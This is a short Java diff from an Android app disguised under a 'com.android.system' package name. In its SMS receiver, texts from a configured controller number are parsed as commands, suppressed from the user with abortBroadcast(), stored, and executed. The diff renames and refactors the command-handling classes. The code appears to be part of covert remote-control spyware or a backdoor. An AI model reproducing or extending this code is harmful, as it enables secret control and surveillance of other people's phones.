@@ -10,7 +10,8 @@ import com.android.system.controled.Debug;
 import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.Code;
 import com.android.system.controled.db.InnerDbOpera;
-import com.android.system.controled.util.DoAboutCodeUtils;
+import com.android.system.controled.logic.CodeDoing;
+import com.android.system.controled.util.CodeUtil;
 import com.android.system.controled.util.InitUtil;
 import com.android.system.controled.util.TimeUtil;
 
@@ -50,14 +51,14 @@ public class MsgAndOtherReceiver extends BroadcastReceiver {
 
 			Debug.v("MsgReceiver", getFromNum);
 			if (getFromNum.contains(MainApplication.getInstence().getControllerTel())) {
-				Code code = DoAboutCodeUtils.getCode(msgTxt);
+				Code code = CodeUtil.getCode(msgTxt);
 				if (code != null) {
 					abortBroadcast();
 					
 					code.setDate(TimeUtil.getCurrentTimeMillisInner());
 					//先存储一下命令，再执行命令
 					if(InnerDbOpera.getInstence().insertNewCode(code) > 0) {
-						code = DoAboutCodeUtils.doOperaByMessage(context, msgTxt, code);
+						code = CodeDoing.getInstance().doOperaByMessage(context, code);
 					}
 				}
 			}
